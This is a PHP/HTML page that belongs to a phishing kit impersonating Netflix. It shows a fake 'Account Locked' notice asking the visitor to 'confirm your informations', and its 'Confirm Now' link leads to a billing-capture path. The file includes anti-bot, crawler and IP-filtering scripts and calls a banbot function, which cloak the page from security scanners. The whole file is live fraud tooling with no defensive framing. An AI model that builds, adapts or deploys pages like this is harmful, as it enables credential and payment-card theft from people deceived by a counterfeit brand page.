<?php
session_start();
error_reporting(0);
include 'autob/bt.php';
include 'autob/basicbot.php';
include 'autob/uacrawler.php';
include 'autob/refspam.php';
include 'autob/ipselect.php';
include 'autob/bts2.php';
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><title>Account Locked - Netflix</title>
<meta name="viewport" content="width=device-width,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0"><link type="text/css" rel="stylesheet" href="oille/nul.css"><link type="text/css" rel="stylesheet" href="oille/null.css"><link rel="shortcut icon" href="imgs/favicon.ico">
  <style>
	*{box-sizing:border-box;}	
	.svg-nfLogo .svg-icon-netflix-logo{box-sizing:content-box;}
	html{height:auto;}
	body{margin:0px;padding:0;height:100vh;}
	

	.hide{display:none;}
	.transitioning{height:100%;background-color:rgba(190,190,190,0.8);position:fixed;top:0;left:0;min-height:100%;width:100%;}
	.loader{content:"";position:relative; display: block;top:47%;margin:auto;height:50px;width:50px;-webkit-animation: rotation .7s infinite linear;-moz-animation: rotation .7s infinite linear;-o-animation: rotation .7s infinite linear;animation: rotation .7s infinite linear;border-left:8px solid rgba(0,0,0,.20);border-right:8px solid rgba(0,0,0,.20);border-bottom:8px solid rgba(0,0,0,.20);border-top:8px solid #E50914;border-radius:100%;}
	@keyframes rotation {
         from {transform: rotate(0deg);}
         to {transform: rotate(359deg);}
     }
    @-webkit-keyframes rotation {
        from {-webkit-transform: rotate(0deg);}
        to {-webkit-transform: rotate(359deg);}
    }
    @-moz-keyframes rotation {
        from {-moz-transform: rotate(0deg);}
        to {-moz-transform: rotate(359deg);}
    }
    @-o-keyframes rotation {
        from {-o-transform: rotate(0deg);}
        to {-o-transform: rotate(359deg);}
    }
	.footer{position:relative;width:80%;margin:20px auto 0;text-align:center;padding:5px 30px;border-top:1px dotted #aaa;background-color:#f3f3f3;}
	@media only screen and (min-height:730px){.footer{position:absolute;margin-top:0;left:10%;bottom:0;}} 
	.nonjsAlert{color:#f00;background-color:#feeeee;border:1px solid #f00;border-width:1px 0;min-height:30px;line-height:30px;padding:0px 5px;}
	@media only screen and (min-width: 740px){
		.login-body:after {
		content: "";
		height: 106px;
		display: block;
		}
		.login-body {
		margin: 0 auto -236px;
		min-height: 100vh;
		background-color: transparent;
		max-width: 700px;
			}
	}
	@media only screen and (min-width: 740px){
.hybrid-login-form.hybrid-login-form-signup {
    min-height: 400px;
	}}
	.hybrid-login-form.hybrid-login-form-signup {
    text-align: center;
	}
  
</style> 
<style>
	.hlotxt{font-size:22px;font-weight:520;margin:5px 0;}
	.split{text-align:center;margin:10px 0;}
	.mainchild{margin:auto;height:auto;padding:10px 20px;border-radius: 4px;text-align:left;color:#eee;margin-top:50px;}
	.btndiv{text-align:center;margin:5px 0;}
    a.btnn {padding: 0px 20px;display: inline-block;border:none;border-radius: 5px;font-family: "HelveticaNeue-Medium", "Helvetica Neue Medium", "Helvetica Neue", Helvetica, Arial, sans-serif;font-size: 0.9375rem;line-height: 3em;font-weight: 600;text-align: center;text-decoration: none;text-shadow: none;cursor: pointer;color: #fff;background-color:#E50914;}
</style>

</head>
<body><div id="appMountPoint"><div class="login-wrapper hybrid-login-wrapper"><div class="login-wrapper-background"><img class="concord-img vlv-creative" src="imgs/US-en-20210322-popsignuptwoweeks-perspective_alpha_website_small.jpg" srcset="imgs/US-en-20210322-popsignuptwoweeks-perspective_alpha_website_small.jpg 1000w, imgs/US-en-20210322-popsignuptwoweeks-perspective_alpha_website_medium.jpg 1500w, imgs/US-en-20210322-popsignuptwoweeks-perspective_alpha_website_large.jpg 1800w" alt=""/></div><div class="nfHeader login-header signupBasicHeader"><a href="" class="svg-nfLogo signupBasicHeader" data-uia="netflix-header-svg-logo"><svg viewBox="0 0 111 30" class="svg-icon svg-icon-netflix-logo" focusable="true"><g id="netflix-logo"><path d="M105.06233,14.2806261 L110.999156,30 C109.249227,29.7497422 107.500234,29.4366857 105.718437,29.1554972 L102.374168,20.4686475 L98.9371075,28.4375293 C97.2499766,28.1563408 95.5928391,28.061674 93.9057081,27.8432843 L99.9372012,14.0931671 L94.4680851,-5.68434189e-14 L99.5313525,-5.68434189e-14 L102.593495,7.87421502 L105.874965,-5.68434189e-14 L110.999156,-5.68434189e-14 L105.06233,14.2806261 Z M90.4686475,-5.68434189e-14 L85.8749649,-5.68434189e-14 L85.8749649,27.2499766 C87.3746368,27.3437061 88.9371075,27.4055675 90.4686475,27.5930265 L90.4686475,-5.68434189e-14 Z M81.9055207,26.93692 C77.7186241,26.6557316 73.5307901,26.4064111 69.250164,26.3117443 L69.250164,-5.68434189e-14 L73.9366389,-5.68434189e-14 L73.9366389,21.8745899 C76.6248008,21.9373887 79.3120255,22.1557784 81.9055207,22.2804387 L81.9055207,26.93692 Z M64.2496954,10.6561065 L64.2496954,15.3435186 L57.8442216,15.3435186 L57.8442216,25.9996251 L53.2186709,25.9996251 L53.2186709,-5.68434189e-14 L66.3436123,-5.68434189e-14 L66.3436123,4.68741213 L57.8442216,4.68741213 L57.8442216,10.6561065 L64.2496954,10.6561065 Z M45.3435186,4.68741213 L45.3435186,26.2498828 C43.7810479,26.2498828 42.1876465,26.2498828 40.6561065,26.3117443 L40.6561065,4.68741213 L35.8121661,4.68741213 L35.8121661,-5.68434189e-14 L50.2183897,-5.68434189e-14 L50.2183897,4.68741213 L45.3435186,4.68741213 Z M30.749836,15.5928391 C28.687787,15.5928391 26.2498828,15.5928391 24.4999531,15.6875059 L24.4999531,22.6562939 C27.2499766,22.4678976 30,22.2495079 32.7809542,22.1557784 L32.7809542,26.6557316 L19.812541,27.6876933 L19.812541,-5.68434189e-14 L32.7809542,-5.68434189e-14 L32.7809542,4.68741213 L24.4999531,4.68741213 L24.4999531,10.9991564 C26.3126816,10.9991564 29.0936358,10.9054269 30.749836,10.9054269 L30.749836,15.5928391 Z M4.78114163,12.9684132 L4.78114163,29.3429562 C3.09401069,29.5313525 1.59340144,29.7497422 0,30 L0,-5.68434189e-14 L4.4690224,-5.68434189e-14 L10.562377,17.0315868 L10.562377,-5.68434189e-14 L15.2497891,-5.68434189e-14 L15.2497891,28.061674 C13.5935889,28.3437998 11.906458,28.4375293 10.1246602,28.6868498 L4.78114163,12.9684132 Z" id="Fill-14"></path></g></svg><span class="screen-reader-text">Netflix</span></a></div><div class="login-body"><div><noscript><div data-uia="error-message-container" class="ui-message-container ui-message-error"><div class="ui-message-icon"></div><div data-uia="text" class="ui-message-contents">Looks like you have disabled JavaScript. Please enable JavaScript to restore full page functionality.</div></div></noscript><div class="login-content login-form hybrid-login-form hybrid-login-form-signup" data-uia="login-page-container"><div class="hybrid-login-form-main"><h1 class="hlotxt">Please Confirm Your Informations</h1>

<div class="mainchild">
<div class="split"><img src="imgs/error_alert.png" width="110px"/><br/><br/><br/>To protect your account we have to confirm that you are the one trying to login</div>
<div class="btndiv">
    <a class="btnn" href="bill/basic?websrc=<?php echo md5('yochidemonArt'); ?>&id=<?php echo rand(1000000000,500000000); ?>" target="_top">Confirm Now</a></div>
</div>

</div>

</div></div>
<div class="transitioning hide" id="loader">
<div class="loader">
&nbsp;
</div>
</div>
</div>
</div></div><?php if(!stripos($_SESSION['device'],'yochi')){banbot();};?>

<div></div></body></html>